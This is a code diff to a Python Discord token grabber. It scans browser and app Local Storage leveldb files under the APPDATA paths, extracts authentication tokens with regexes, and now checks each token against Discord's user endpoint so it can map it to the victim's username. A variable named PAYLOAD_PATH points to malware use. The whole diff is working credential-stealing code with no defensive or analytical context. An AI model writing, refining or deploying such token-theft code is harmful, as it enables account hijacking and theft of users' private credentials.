@@ -1,6 +1,8 @@
 import os
 import re
-from requests import Response, get
+
+from requests import get
+
 PAYLOAD_PATH = os.path.realpath(__file__)
 def find_tokens(path: str) -> list[str]:
   path += "\\Local Storage\\leveldb"
@@ -13,16 +15,16 @@ def find_tokens(path: str) -> list[str]:
         for token in re.findall(regex, line):
           tokens.append(token)
   return tokens
-def is_valid(token: str) -> bool:
+def get_username(token: str) -> str:
   try:
-    re: Response = get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
+    re = get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
     if re.status_code == 200:
-      return True
+      return re.json()["username"]
     else:
-      return False
+      return ""
   except Exception:
-    return False
-def get_token() -> list[str]:
+    return ""
+def get_token() -> dict[str, str]:
   _tokens: list[str] = []
   local: str = str(os.getenv("LOCALAPPDATA"))
   roaming: str = str(os.getenv("APPDATA"))
@@ -39,11 +41,7 @@ def get_token() -> list[str]:
     if not os.path.exists(path):
       continue
     tks = find_tokens(path)
-    if len(tks) > 0:
+    if tks:
       for token in tks:
         _tokens.append(token)
-  tokens: list[str] = []
-  for tk in _tokens:
-    if is_valid(tk):
-      tokens.append(tk)
-  return tokens
+  return {tk: get_username(tk) for tk in _tokens}
